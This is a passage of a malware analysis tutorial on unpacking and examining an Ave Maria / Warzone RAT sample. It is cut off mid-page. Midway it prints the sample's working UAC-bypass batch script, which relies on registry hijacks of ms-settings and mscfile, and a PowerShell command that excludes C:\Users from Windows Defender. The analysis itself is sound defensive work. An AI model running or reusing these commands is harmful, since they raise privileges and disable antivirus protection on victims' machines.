{
    "id": "e57f9777-4e55-44c6-8e34-5d015efd5124",
    "created_at": "2022-11-26T02:53:28.942109Z",
    "updated_at": "2025-03-27T02:17:14.8114Z",
    "deleted_at": null,
    "sha1_hash": "99411dadc52675d3d86e217564ae8bb7b900754f",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-11-24T13:09:18Z",
    "file_modification_date": "2022-11-24T13:09:18Z",
    "file_size": 4048456,
    "plain_text": "# Malware Analysis Series (MAS): \n Article 6\n\n**by Alexandre Borges**\n**release date: NOVEMBER/24/2022 | rev: A.1**\n\n## 0. Quote\n\n**_“Long is the way and hard, that out of Hell leads up to Light.”. (Paradise Lost - John Milton 1667, and also_**\n_mentioned by Detective Somerset | “Seven” movie -- 1995 )_\n\n## 1. Introduction\n\nWelcome to the the sixth article of Malware Analysis Series, where we are keeping reviewing concepts,\ntechniques and practical steps used for analyzing malicious PE binaries.\n\nIf readers have not read past articles yet, all of them are available on the following links:\n\n  - **[MAS_1: https://exploitreversing.com/2021/12/03/malware-analysis-series-mas-article-1/](https://exploitreversing.com/2021/12/03/malware-analysis-series-mas-article-1/)**\n\n  - **MAS_2:** [https://exploitreversing.com/2022/02/03/malware-analysis-series-mas-article-2/](https://exploitreversing.com/2022/02/03/malware-analysis-series-mas-article-2/)\n\n  - **[MAS_3: https://exploitreversing.com/2022/05/05/malware-analysis-series-mas-article-3/](https://exploitreversing.com/2022/05/05/malware-analysis-series-mas-article-3/)**\n\n  - **MAS_4:** [https://exploitreversing.com/2022/05/12/malware-analysis-series-mas-article-4/](https://exploitreversing.com/2022/05/12/malware-analysis-series-mas-article-4/)\n\n  - **[MAS_5: https://exploitreversing.com/2022/09/14/malware-analysis-series-mas-article-5/](https://exploitreversing.com/2022/09/14/malware-analysis-series-mas-article-5/)**\n\nTo keep the coherence of what we have done so far, all malware samples being analyzed are available\nfrom the well-known sandbox services such as Triage, Malware Bazaar, Virus Total, Malshare, Polyswarm\nand other ones.\n\nIf you wish, you can use Malwoverview tool [(https://github.com/alexandreborges/malwoverview) to](https://github.com/alexandreborges/malwoverview)\ndownload them and, get first information and analysis of the each sample from all of these services.\n\nThis article reviews procedures involved and developed to analyze malware since getting basic information\nabout the binary until extracting essential information from the binary itself.\n\nEventually, taken steps could be terribly similar to followed in previous articles, but the truth is that each\nmalware brings a different context and unexpected challenges that forces us to choose a different\napproach to proceed with our analysis and, sometimes, we need to use different tools and methodologies\nto get a better understanding of the code and the malicious code.\n\nOf course, it is not possible to get the big picture of a malware attack without have analyzed all artifacts\nand code associated with mentioned campaign, but our purpose here is only learning and getting key\ninformation from the binary because, though it is one of pieces of puzzle, it takes a considerable number of\npages to explain only few related details.\n\n1 | P a g e\n\n\n-----\n\nWe will be analyzing few aspects of the Ave Maria malware, which is sometimes viewed as the WARZONE\nRAT or even a derivation from it. Initially, my objective would be to analyze a simple malware to review\nsome of the concepts taught in previous articles and, this way, to close a first cycle of fundamental articles\nto be able to proceed to other topics, but I was surprised when I noticed that this sample has a customized\nRC4 algorithm and, of course, my plans also changed. Actually, it does not make the sample harder to\nanalyze, but the stage of writing a C2 configuration extractor takes a bit more time. Personally, I hadn’t\nseen Ave Maria samples using this algorithm previously, but afterwards other similar sample appeared,\nand this reinforce the need of writing an appropriate extractor. In general, there is not anything really\nspecial on this sample because it’s a typical malware threat and family, but any binary is always able to\nhelp us to learn news concepts and tricks.\n\n## 2. Acknowledgments\n\nI would like to publicly thank Ilfak Guilfanov (@ilfak) and Hex-Rays (@HexRaysSA) for supporting this\nproject by providing me with a personal license of the IDA Pro.\n\nMy gratitude is endless because certainly I could not keep writing this series without a personal license\n(without depending on corporate licenses).\n\nHonestly, I do not have enough words to say how happy, thankful, and fortunate I feel myself in receiving\ntheir help. Although it is already much more than I would be able to dream in receiving, last June/2022\n**Ilfak and Hex-Rays once again kindly agreed in helping me by providing new licenses of IDA Pro for**\nmacOS/iOS and Linux due to new series I just started writing and planned to release as soon as possible.\nPersonally, all words from Ilfak expressing his trust and praise about this series of articles until now are the\nmost important for me.\n\nOnce again: thank you for everything, Ilfak.\n\n## 3. Environment Setup\n\nThis article uses a lab setup that reflects the following environment:\n\n  - **Windows 11 running on a virtual machine. You’re able to download a virtual machine for**\n\n**[VMware, Hyper-V, VirtualBox or Parallels from Microsoft on: https://developer.microsoft.com/en-](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)**\n[us/windows/downloads/virtual-machines/. If you already have a valid license for Windows 11, so](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)\n[you can download the ISO file from: https://www.microsoft.com/software-download/windows11](https://www.microsoft.com/software-download/windows11)\n\n  - **IDA Pro or IDA Home version (@HexRaysSA):** [https://hex-rays.com/ida-pro/](https://hex-rays.com/ida-pro/) . Of course, readers\n\nmight use other reverse engineering tool, but I will be using IDA Pro and its decompiler in this\narticle.\n\n  - **System Informer (Process Hacker):**\n\n     - Install Visual Studio 2022, including MSVC v143 Spectre-mitigated libs (latest).\n\n2 | P a g e\n\n\n-----\n\n     - **git clone https://github.com/winsiderss/systeminformer.git**\n\n     - cd systeminformer\\build\n\n     - .\\build_release.cmd\n\n     - Go to systeminformer\\build\\output\n\n     - Execute processhacker-build-setup.exe\n\n  - **x64dbg(@x64dbg):** [https://x64dbg.com/](https://x64dbg.com/)\n\n  - **PEBear (@hasherezade):** [https://github.com/hasherezade/pe-bear-releases](https://github.com/hasherezade/pe-bear-releases)\n\n  - **DiE (from @horsicq):** [https://github.com/horsicq/DIE-engine/releases](https://github.com/horsicq/DIE-engine/releases)\n\n  - **CFF Explorer:** [https://ntcore.com/?page_id=388](https://ntcore.com/?page_id=388)\n\n  - **HxD editor:** [https://mh-nexus.de/en/hxd/](https://mh-nexus.de/en/hxd/)\n\n  - **Malwoverview:** [https://github.com/alexandreborges/malwoverview](https://github.com/alexandreborges/malwoverview)\n\n  - **[pestudio: https://github.com/alexandreborges/malwoverview](https://github.com/alexandreborges/malwoverview)**\n\n  - **wireshark:** [https://www.wireshark.org/#download](https://www.wireshark.org/#download) | apt install -y wireshark\n\n  - **Floss:** **[pip install -U flare-floss | https://github.com/mandiant/flare-floss/releases/tag/v2.0.0](https://github.com/mandiant/flare-floss/releases/tag/v2.0.0)**\n\n  - **Capa:** **[pip install -U flare-capa | https://github.com/mandiant/capa/releases](https://github.com/mandiant/capa/releases)**\n\n## 4. References\n\nIndeed, there’re many references about the Ave Maria trojan/backdoor (as known as Warzone Rat or, at\nleast, a derivation from it) and, although I haven’t had enough time to read them, I recommend readers to\ndo it because they were written by excellent security researchers and companies, which covered and\nanalyzed several aspects of the same family, and readers can learn what’s more appropriate for their work.\nThe list below does not have any preferred order:\n\n  - [https://any.run/malware-trends/avemaria](https://any.run/malware-trends/avemaria)\n\n  - [https://blogs.blackberry.com/en/2021/12/threat-thursday-warzone-rat-breeds-a-litter-of-](https://blogs.blackberry.com/en/2021/12/threat-thursday-warzone-rat-breeds-a-litter-of-scriptkiddies)\n\n[scriptkiddies](https://blogs.blackberry.com/en/2021/12/threat-thursday-warzone-rat-breeds-a-litter-of-scriptkiddies)\n\n### ▪ https://team-cymru.com/blog/2019/07/25/unmasking-ave_maria/\n\n  - [https://blog.talosintelligence.com/2021/09/operation-armor-piercer.html](https://blog.talosintelligence.com/2021/09/operation-armor-piercer.html)\n\n  - [https://blog.morphisec.com/threat-alert-ave-maria-infostealer-on-the-rise-with-new-stealthier-](https://blog.morphisec.com/threat-alert-ave-maria-infostealer-on-the-rise-with-new-stealthier-delivery)\n\n[delivery](https://blog.morphisec.com/threat-alert-ave-maria-infostealer-on-the-rise-with-new-stealthier-delivery)\n\n  - [https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/](https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/)\n\n  - [https://blogs.quickheal.com/warzone-rat-beware-of-the-trojan-malware-stealing-data-triggering-](https://blogs.quickheal.com/warzone-rat-beware-of-the-trojan-malware-stealing-data-triggering-from-various-office-documents/)\n\n[from-various-office-documents/](https://blogs.quickheal.com/warzone-rat-beware-of-the-trojan-malware-stealing-data-triggering-from-various-office-documents/)\n\n  - [https://www.trendmicro.com/en_us/research/21/i/Water-Basilisk-Uses-New-HCrypt-Variant-to-](https://www.trendmicro.com/en_us/research/21/i/Water-Basilisk-Uses-New-HCrypt-Variant-to-Flood-Victims-with-RAT-Payloads.html)\n\n[Flood-Victims-with-RAT-Payloads.html](https://www.trendmicro.com/en_us/research/21/i/Water-Basilisk-Uses-New-HCrypt-Variant-to-Flood-Victims-with-RAT-Payloads.html)\n\n  - [https://www.domaintools.com/resources/blog/warzone-1-0-rat-analysis-report](https://www.domaintools.com/resources/blog/warzone-1-0-rat-analysis-report)\n\nIf you need and additional and much more complete resource, which contains most references related to\nAve Maria threat, so the recommendation is to visit Malpedia website:\n\n  - [https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria](https://malpedia.caad.fkie.fraunhofer.de/details/win.ave_maria)\n\n3 | P a g e\n\n\n-----\n\n**Malwoverview tool offers the possibility to get Ave Maria information and any other family from Malpedia**\non command line by executing the following:\n\n**[Figure 1] Ave Maria’s information retrieved from Malpedia by using Malwoverview**\n\n## 5. Recommended Blogs and Websites\n\nThere are excellent cyber security researchers keeping blogs and writing really good articles related to\nreverse engineering, malware analysis, windows internals, and digital forensics, so readers could be\ninterested in reading and following their contents. I tried googling to make a quick and sorted list in\n**alphabetical order as follow below:**\n\n  - [https://hasherezade.github.io/articles.html](https://hasherezade.github.io/articles.html) **(by Aleksandra Doniec: @hasherezade)**\n\n  - [https://malwareunicorn.org/#/workshops](https://malwareunicorn.org/#/workshops) **(by Amanda Rousseau: @malwareunicorn)**\n\n  - [https://captmeelo.com/](https://captmeelo.com/) **(by Capt. Meelo: @CaptMeelo)**\n\n  - [https://csandker.io/](https://csandker.io/) **(by Carsten Sandker: @0xcsandker)**\n\n  - [https://chuongdong.com/](https://chuongdong.com/) **(by Chuong Dong: @cPeterr)**\n\n  - [https://elis531989.medium.com/](https://elis531989.medium.com/) **(by Eli Salem: @elisalem9)**\n\n  - [https://hex-rays.com/blog/](https://hex-rays.com/blog/) **(by Hex-Rays: @HexRaysSA)**\n\n  - [https://github.com/Dump-GUY/Malware-analysis-and-Reverse-engineering](https://github.com/Dump-GUY/Malware-analysis-and-Reverse-engineering) **(by Jiří Vinopal:**\n\n**@vinopaljiri)**\n\n  - [https://kienmanowar.wordpress.com/](https://kienmanowar.wordpress.com/) **(by Kien Tran Trung:** **@kienbigmummy)**\n\n  - [https://www.inversecos.com/](https://www.inversecos.com/) **(by Lina Lau: @inversecos)**\n\n  - [https://maldroid.github.io/](https://maldroid.github.io/) **(Łukasz Siewierski: @maldr0id)**\n\n4 | P a g e\n\n\n-----\n\n  - [https://www.ragingrock.com/AndroidAppRE/](https://www.ragingrock.com/AndroidAppRE/) **(by Maddie Stone: @maddiestone)**\n\n  - [https://azeria-labs.com/writing-arm-assembly-part-1/](https://azeria-labs.com/writing-arm-assembly-part-1/) **(by Maria Markstedter: @Fox0x01)**\n\n  - [https://github.com/mnrkbys](https://github.com/mnrkbys) **(by Minoru Kobayashi: @unkn0wnbit)**\n\n  - [https://windows-internals.com/author/yarden/ (by Yarden Shafir @yarden_shafir)](https://windows-internals.com/author/yarden/)\n\nCertainly, there’re many other excellent blogs containing good series of articles on reverse engineering and\nmalware analysis., so I’ll include these references as soon as I learn about them in next articles.\n\n## 6. Gathering Information 1\n\nThis Ave Maria sample downloaded from Malware Bazaar and its SHA 256 hash is:\n\n**6da3064773edf094f014b7aa13f2e3f74634f62552a91f88bf306f962bbf0563**\n\nFirst time I learned about this sample was through message shared by James (@James_inthe_box) on his\nTwitter account few months ago:\n\n  - [https://twitter.com/James_inthe_box/status/1551605691701374977](https://twitter.com/James_inthe_box/status/1551605691701374977)\n\nReaders can download it easy by using Malwoverview:\n\n  - **malwoverview.py -b 5 -B**\n\n**6da3064773edf094f014b7aa13f2e3f74634f62552a91f88bf306f962bbf0563 -o 0**\n\nThe password is “infected” and to unpack it I suggest you use: 7z e <zip file> command.\n\nIf readers want to find other Ave Maria malware samples from Malware Bazaar, so Malwoverview tool\nmight be used again:\n\n**[Figure 2] Ave Maria samples available on Malware Bazaar**\n\n5 | P a g e\n\n\n-----\n\nOf course, to simplify the operation, readers could use grep command to show SHA256 hashes:\n\n**[Figure 3] Ave Maria SHA256 hashes from Malware Bazaar**\n\nReturning to our sample, we can get first information about it by checking Virus Total database:\n\n**[Figure 4] Virus Total AV reports using Malwoverview**\n\n\n6 | P a g e\n\n\n-----\n\nChecking for past reports on Triage we the following output (truncated):\n\n**[Figure 5] Triage Report List**\n\nWe can examine one of them by providing its respective ID in the next command below:\n\n**[Figure 6] Triage Summarized Report**\n\n\n7 | P a g e\n\n\n-----\n\nChecking for the dynamic/behavior report from Virus Total we have the following output:\n\n**[Figure 7] Dynamic Behavior Report from Virus Total**\n\n\n8 | P a g e\n\n\n-----\n\nAfter getting tons of information about the malware sample, we have the following evidence:\n\n  - It could have a downloader functionality and, eventually, dropping a binary or even script onto the\n\nfilesystem.\n\n  - It apparently performs injection, but this time we do not know whether it’s a self-injection or\n\nremote injection.\n\n  - It contacts different IPs (maybe there could be a set of C2, but we do not know yet).\n\n  - Many processes are started, and two of them seems to be a DLL (due to rundll32.exe) and a script\n\n(Scxozm0.bat).\n\n  - It adds a directory into the Windows Defender’s whitelist.\n\n  - There is a process running a DLL (COM Object) using dllhost.exe (COM Surrogate), but we do not\n\nknow from where it is coming.\n\n  - The contacted domain (morientlines.com) is really malicious, but it is not the final. You can confirm\n\nit by getting further information from Virus Total: malwoverview.py -v 7 -V morientlines.com -o 0\n\n## 7. Unpacking the sample and getting artifacts\n\nFirst, we must unpack the malware. Before performing the unpacking, it is worth to check it using DiE:\n\n**[Figure 8] DiE report of the downloaded sample**\n\nAccording to the output above, it is an executable 32-bit binary and compiled with Borland Dephi. There\nare malware packers using Borland Dephi compilers to conceal the real malware inside the original sample\nand maybe this is the case.\n\nOf course, there are multiple other artifacts such high entropy of sections, high total entropy (7.04007) and\nnot explicit imported functions/DLLs related to network communication, although it imports COM related\nfunctions:\n\n9 | P a g e\n\n\n-----\n\n**[Figure 9] PE Bear – sample before unpacking**\n\nBeing very direct, to unpack this sample would be enough to run it and extract it from memory using\n**Process Hacker / System Informer. However, let us setup few breakpoints (CTRL+ G → target function →**\n**F2) to follow few details:**\n\n  - **WriteProcessMemory**\n\n  - **WriteFile**\n\n  - **NtResumeThread**\n\nWe can optionally do other supplemental alternatives that might bring more information to our analysis:\n\n  - **Keep the Wireshark running to collect network information.**\n\n  - **Configure PowerShell Logging**\n\n  - **Disable ASLR of the binary or entire system.**\n\nOf course, readers do not need to do these steps and it is your choice to configure them. Anyway, as\nrunning Wireshark is trivial, so should remember how to enable PowerShell logging.\n\n1. launch Local Group Policy (gpedit).\n2. Go to Administrative Templates → Windows Components → Windows PowerShell and turn on\n\nthe following settings:\n\n**a.** **Module Logging**\n**b.** **PowerShell Script Blocking Logging**\n**c.** **PowerShell Transcription**\n\n10 | P a g e\n\n\n-----\n\nPlease, pay attention to Module Logging and PowerShell Transcription because both options request you\nprovide short details. For example, in my case, I configured the transcription directory as\n“C:\\PowerShell_Transcription”:\n\n**[Figure 10] PowerShell Logging configuration**\n\nThe next step is to disable the ASLR for the entire system or even to the specific binary (to this binary is not\nnecessary because the ASLR flag is not marked). Only to refresh the reader, the necessary steps are:\n\n  - Go to HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management\n\n  - Create an entry value named MoveImages with 0x00000000 (REG_DWORD).\n\n  - **Reboot the system.**\n\n**[Figure 11] Disabling ASLR for the entire system**\n\n11 | P a g e\n\n\n-----\n\nOf course, the big advantage is that, while debugging the binary on x64dbg/x32dbg, all addresses match\nbetween themselves. If readers do not want or even can not to disable ASLR, so another alternative is\n**rebasing the program. If the reader is not aware about how to do it, so the base address of running binary**\ncan be acquired from the debugger, as shown below:\n\n**[Figure 12] x32dbg: showing the base address**\n\nHaving the base address, so open the IDA Pro and go to Edit → Segments → Rebase Program:\n\n**[Figure 13]IDA Pro rebasing**\n\n12 | P a g e\n\n\n-----\n\nOnly to underscore a point: for sure, you can disable ASLR or perform rebasing any time, but it can be more\nuseful AFTER unpacking the binary, when you have the actual malicious executable on hands and need\n**to debug it.**\n\nAs we did in the last article, you could have chosen using the CFF Explorer and “removed” the ASLR\n**characteristic, as shown below:**\n\n**[Figure 14] CFF Explorer: ASLR manipulation**\n\nReturning to the x64dbg debugging session, we’ve setup only three breakpoints, you run the malware\nsample. Few recommendations and notes:\n\n  - If you hit an exception, so you should pass it to debugger (SHIFT+F9).\n\n  - Keep both System Informer (Process Hacker) and/or Process Explorer opened.\n\n  - Hits on NtResumeThread breakpoint are used to control the execution.\n\n  - There will be hits on WriteFile breakpoint, so the suggestion is examining what is being written\n\nonto filesystem.\n\n  - It would be interesting to create a folder to save all “artifacts” (files) saved during the debugging\n\nsession.\n\n  - When the “WriteProcessMemory” breakpoint is hit, so you we can search for a new binary on\n\nmemory (Memory Map) and, to accomplish this task, the “Find Patterns” feature is extremely\nuseful.\n\n  - Keep eyes on Process Explorer / System Informer because a new “identical” process will be\n\n**generated in suspended mode and we will have to open a second instance of x64dbg, attach it to**\n**this new process and setup** **a breakpoint at its beginning (entry point).**\n\n  - Set the same breakpoints in the second debugging session.\n\nWe could have analyzed the original packed malware to understand how it works and its behavior while\nunpacking, but task could take time right now and divert our focus from what is really important.\n\n13 | P a g e\n\n\n-----\n\n**[Figures 15 and 16] Process Explorer: Artifacts**\n\nBoth Process Explorer outputs present interesting information, which help us to get a better\ncomprehension about what is happening:\n\n  - Two scripts (C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\Public\\Libraries\\Scxozmt.bat\"” and\n\n**Scxozmt.bat) are executed and, although is not shown in the figures, a PowerShell execution also**\noccurs. Actually, the second script is a launcher of the first one.\n\n  - A PE binary (C:\\Users\\Administrator\\AppData\\Local\\Temp\\198.exe) in written onto file system\n\nand also executed.\n\n14 | P a g e\n\n\n-----\n\n  - An interesting aspect is this PE binary’s name changes in different sessions, and it is an UPX file. Its\n\n**SHA256 hash is 0df3d05900e7b530f6c2a281d43c47839f2cf2a5d386553c8dc46e463a635a2c.**\n\n**[Figures 17] Process Explorer: the script saved to filesystem**\n\nThe Scxozmt.bat script, which is responsible for a UAC bypassing (there’s a long list of bypassing\ntechniques on https://github.com/redcanaryco/atomic-red[team/blob/master/atomics/T1548.002/T1548.002.md) by using ComputerDefaults.exe to define an](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md)\n**exclusion path for Windows Defender, has the following content:**\n\n  - **start /min C:\\Users\\Public\\Libraries\\ScxozmO.bat & exit**\n\nThe ScxozmO.bat script has the following content:\n\n**@echo off**\n**set mypath=%cd%**\n**if \"%~1\" equ \"\" (set saka=%mypath%\\Cdex.bat) ELSE set \"saka=%~1\"**\n\n**net session >nul 2>&1 || goto :label**\n**%saka%**\n**exit /b 2**\n\n15 | P a g e\n\n\n-----\n\n**:label**\n**::REQUIREMENTS**\n**whoami /groups|findstr /i \"\\<S-1-5-32-544\\>\" >nul 2>&1**\n**if ERRORLEVEL 1 exit /b 1**\n\n**::Windows Version**\n**for /f \"tokens=4-5 delims=. \" %%i in ('ver') do set WIN_VER=%%i.%%j**\n\n**::aka Level**\n**:: 2 High**\n**:: 5 Default**\n**:: 0 None**\n**set key=\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"**\n**for /f \"skip=2 tokens=3\" %%U in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set**\n**/a \"aka=%%U\"**\n\n**::EXPLOIT**\n**if %aka% equ 2 exit /b 1**\n**if %aka% equ 5 (**\n**for %%V in (6.1 6.2 6.3) do if \"%WIN_VER%\" == \"%%V\" call :exploit mscfile**\n**CompMgmtLauncher.exe %saka%**\n**if \"%WIN_VER%\" == \"10.0\" call :exploit ms-settings ComputerDefaults.exe %saka%**\n**)>nul 2>&1**\n**if %aka% equ 0 powershell -c Start-Process \"%saka%\" -Verb runas**\n\n**exit /b 0**\n\n**:exploit <key> <trigger> <saka>**\n**set regPath=\"HKCU\\Software\\Classes\\%1\\shell\\open\\command\"**\n**reg add %regPath% /d \"%~3\" /f**\n**reg add %regPath% /v DelegateExecute /f**\n**%~2**\n**reg delete \"HKCU\\Software\\Classes\\%1\" /f**\n**exit /b**\n\nThe referred PowerShell script is executed, extracted from PowerShell Transcription Logging, is:\n\n  - **powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -**\n\n**Command Add-MpPreference -ExclusionPath 'C:\\Users'**\n\nAs stated previously, the PowerShell script is adding an exclusion path to Windows Defender engine.\nReturning to the binary execution, different artifacts appear during the execution and, obviously, we don’t\nhave time to analyze all of them here, but I’ll try to highlight few of them to illustrate a bit what’s\nhappening in this infection context.\n\nChecking the memory of the first running process, we can find a small RWE region (28K) containing a\npossible PE binary there and it is a mapped version because we can observe its first section starting at\n0x1000. However, that is not important because it comes from a plugin, so forget it:\n\n16 | P a g e\n\n\n-----\n\n**[Figure 18] System Informer: a small RWX region coming from a plugin**\n\n**[Figure 19] System Informer: a likely mapped region in a PE executable**\n\n\n17 | P a g e\n\n\n-----\n\nThe other extracted binary from memory is the following one:\n\n**[Figure 20] PE Bear: second PE executable extracted from memory**\n\nAccording to the figure above, readers should notice that at end this file is only a stub for the following\nsteps in the infection process, and there’re only the basic functions to do that: GetProcAddress and\n**LoadLibrary. As it was extracted from memory (so it was a mapped version), I fixed its section headers:**\n\n**[Figure 21] PE Bear: fixed second PE executable extracted from memory**\n\nTo remember this procedure:\n\n  - I found an ERW region containing the PE binary on the Memory Map view of x32dbg, right clicked\n\nand picked up “Dump Memory to File” option.\n\n18 | P a g e\n\n\n-----\n\n  - I opened into PE Bear and, as section headers were unaligned, so I needed to fix them. To fix them:\n\n`o` I copied the Virtual Address to Raw Address column for each section.\n`o` I calculated the difference of offset from one section to the next one and filled up the Raw\n\n**Size column.**\n`o` I copied both calculated values from Raw Size to Virtual Size.\n`o` I fixed the Image Base in Optional Hds tab by using the same address that makes part of this\n\ndumped file (0x7FB00000).\n`o` I saved the resulting and fixed file by right clicking on the top left filename and choosing\n\n“Save the executable as”.\n\nAs I mentioned previously, soon the second and suspended process has appeared (Hollowing code\ninjection technique), I launched a second instance of the x32dbg and attached to the mentioned process\nand, in the Symbol tab, I setup a breakpoint at the entry point, as shown below:\n\n**[Figure 22] Breakpoint configured on the entry point of the second x32dbg**\n\nOnce again, readers could setup same breakpoints on the second x32dbg session and, thus, on the second\nstage (injected code). No doubts, along of two debugging sessions, the breakpoint on WriteFile( ) will\nreveal a list of files (binaries and non-binaries) being saved in file system, so there will be other potential\nartifacts to be analyzed. Of course, we will not analyze all of them and, eventually, we’ll quickly analyze\nonly one of them.\n\nThe first acquired was written as C:\\Users\\Administrator\\AppData\\Local\\Temp\\198.exe.\n\n19 | P a g e\n\n\n-----\n\nThis file (SHA256: 0df3d05900e7b530f6c2a281d43c47839f2cf2a5d386553c8dc46e463a635a2c) is packed\nusing UPX and, after unpacking it (upx -d <binary file>), we found out it is a DLL (SHA256:\n**62a82545cd72194ee431c5c3fe86030d2bdd837cc729bdced20cd0d9cb319dd8) that has the following Virus**\nTotal evaluation:\n\n**[Figure 23] Virus Total: extracted and unpacked 198.exe file**\n\nA quick overview of the Imported functions shows us the following:\n\n**[Figure 24] PE Bear: imported function of 198.exe file**\n\n20 | P a g e\n\n\n-----\n\nClearly this binary has network communication functions and two of these clues are the WS2_32.dll\n(WinSock 2) and IPHLPAPI.dll (importing GetIpAddrTable( ) and GetBestRoute( ) APIs).\n\nA second file file came up (named mas_6_086B0000.bin) and, according to the following figure, readers\ncan notice it was found through the breakpoint on WriteFile( ):\n\n**[Figure 25] Breakpoint on WriteFile: revealing new artifacts**\n\nSaving this dump from memory, readers can also notice it is a new binary using relevant functions\nimported from kernel32.dll, as shown below:\n\n**[Figure 26] PE Bear: the second binary got from breakpoint on WriteFile**\n\n21 | P a g e\n\n\n-----\n\nThis binary, according to the Virus Total, it is an RDP wrapper and given as malicious. It’s a wrapper\n[(there’s a well-known project on https://github.com/stascorp/rdpwrap, but you are able to find many](https://github.com/stascorp/rdpwrap)\nother ones that are similar) that’s has been used over several red team operations and by malware actors\nin general, and presents several functionalities as being able to enumerate running servers, creating\n**services (persistence), dropping PE files, modifying firewall configuration (opening 3389 port), injecting**\n**code, gathering system information, stealing information (keystrokes) and many other activities:**\n\n**[Figure 27] PE Bear: the second binary, RDP Wrapper, verified against VT**\n\nAdditionally, another file (the third one) was extracted (first named as mas_6_08B90000.bin, but finally\nrenamed as rdprwrap.ini), which is the configuration file of the RDP Wrapper mentioned above.\n\nAlthough I will not focus in explaining details of this configuration file and neither to show its content\nbecause it is too large, readers are able to follow the moment it is extracted onto the the file system\n(C:\\Program Files\\Microsoft DN1\\rdpwrap.ini) by using the same breakpoint on WriteFile function, as\nshown below:\n\n22 | P a g e\n\n\n-----\n\n**[Figure 28] PE Bear: rdpwrapper.ini being saved onto filesystem**\n\nA fourth file (named mas_6_009E7000.bin -**4b085a71dd06ba80be337990ddea71b1de63469107ea719d7e2207e700716139) has came up from the**\ndebugging process using the WriteFile breakpoint. However, it is legit DLL (rfxvmt.dll) and, as it is clean,\nwe will not comment about it here.\n\nThe fifth (mas_6.bin_0x660000-0x15c000.bin) and sixth (mas_6.bin_0xa80000-0x15a000.bin) files can be\neasily extracted from memory using System Informer (Process Hacker) as shown below:\n\n**[Figure 29] System Informer (Process Hacker): two regions with injected code**\n\n23 | P a g e\n\n\n-----\n\nReaders can do it by double clicking on the malicious process → **Memory Tab and, using Option button,**\nmark “Highlight executable pages,” as shown below:\n\n**[Figure 30] System Informer (Process Hacker): highlighting executable pages**\n\nThe content of both files can be visualized with a double-click and, as readers can confirm, they are PE files:\n\n**[Figure 31] System Informer (Process Hacker): visualizing the PE file in the region**\n\n24 | P a g e\n\n\n-----\n\n**[Figure 32] System Informer (Process Hacker): visualizing the PE file in the second region**\n\nThe fifth file (mas_6.bin_0x660000-0x15c000.bin – renamed here as file_5.bin) is classified as being\n_“Morphine” according to VT (before submitting it, readers will have to fix its PE sections using PEBear as I_\nexplained previously):\n\n**[Figure 33] Malwoverview: fifth file submitted to Virus Total**\n\n25 | P a g e\n\n\n-----\n\nThe sixth extracted file (mas_6.bin_0xa80000-0x15a000.bin – renamed here as file_6.bin) also has its\n**section headers misaligned and readers need to fix them (do not forget to fix the base address too) using**\n**PE Bear as shown below:**\n\n**[Figure 34] PE Bear: aligning section headers and fixing import table**\n\nThis sixth file has relevant imported DLLs such as Bcrypt.dll, WS2_32.dll, urlmon.dll, NETAPI32.dll\n(NetUserAdd and NetLocalGroupAddMembers functions) and WININET.dll, for example, and it is the\nrunning process after all of this infection process.\n\n26 | P a g e\n\n\n-----\n\nSubmitting the sample to Virus Total we have:\n\n**[Figure 35] Malwoverview: submitting and collecting report from Virus Total**\n\nAs reader can confirm, the artifact is considered malicious by most antiviruses, it is an info-stealer, but\nthere isn’t certain that it’s an Ave Maria / Warzone Rat.\n\nTo supplement the information, I checked whether the sample was present on Triage and, apparently,\nthere was not:\n\n**[Figure 36] Malwoverview: checking the existence of the sample on Triage**\n\nAs this sample did not exist on Triage, so I submitted it and, a couple of minutes later, I recovered the\nreport as shown on the next page:\n\n27 | P a g e\n\n\n-----\n\n28 | P a g e\n\n\n\n**[Figure 37] Malwoverview: recovering the**\n**sample’s report from Triage.**\n\n\n-----\n\nAs we could confirm, we are really handling with Ave Maria | Warzone RAT. It’s valid to highlight that I\n**didn’t submit the unpacked sample when the C2 was alive, but only more than two weeks later.**\nTherefore, Triage and Virus Total had not enough conditions for producing a more detailed report.\nAnyway, I collected other IOCs when C2 servers was alive (at same day that it was reported on Twitter by\n_James:_ **_@James_inthe_box) and the Process Explorer shows the established connection with the server:_**\n\n**[Figure 38] Process Explorer: recovering the sample’s report from Triage.**\n\nChecking handles associated to the process is another recommended action and, not surprisingly, we\nfound evidence of the unpacked payload’s network communication.\n\nObserve that there are lines that are highlighted with the cyan color, and they are \\Device\\Afd (AFD:\n**Ancillary Function Driver), which is related to afd.sys driver and, as readers could expect, it is one of**\n**responsible drivers for managing network communication through Winsock2, as shown below:**\n\n**[Figure 39] System Informer: highlighted handles related to network communication**\n\nObserving the final unpacked payload running through System Informer (Process Hacker) we have:\n\n29 | P a g e\n\n\n-----\n\n**[Figure 40] System Informer: final payload running**\n\nIt’s interesting to notice that its image coherence is not 100% because the image is running on memory\nisn’t the same of the image saved onto disk due to injected code regions that we discovered. Examining the\nsecurity token, we also learned that SeDebugPrivilege was enabled on runtime:\n\n**[Figure 41] System Informer:  SeDebugPrivilege enabled on runtime**\n\nThis is the kind of powerful privilege because the process holding this privilege can acquire any process\nhandle, inspect and, in general, access any process. Additionally, according to Microsoft, the definition of\nthis privilege is “Required to debug and adjust the memory of a process owned by another account”\n[(https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)\n\nTherefore, we can infer that a possible or similar API sequence as the one shown were eventually used for\nobtaining this result:\n\na. **LookupPrivilegeValue( ): it retrieves the locally unique identifier, which is used to represent the**\n\nprivilege name.\nb. **GetTokenInformation( ): it retrieves information about a given access token.**\nc. **AdjustTokenPrivileges( ): it enables/disables privileges for a given token.**\n\n**Pay attention: I didn’t state this sequence has been used for this binary, but that it’s a possible sequence**\nof functions to change the privilege on runtime. For example, GetTokenInformation( ) wouldn’t really\nneeded to accomplish the objective. Anyway, I think that readers have understood the general idea.\n\n30 | P a g 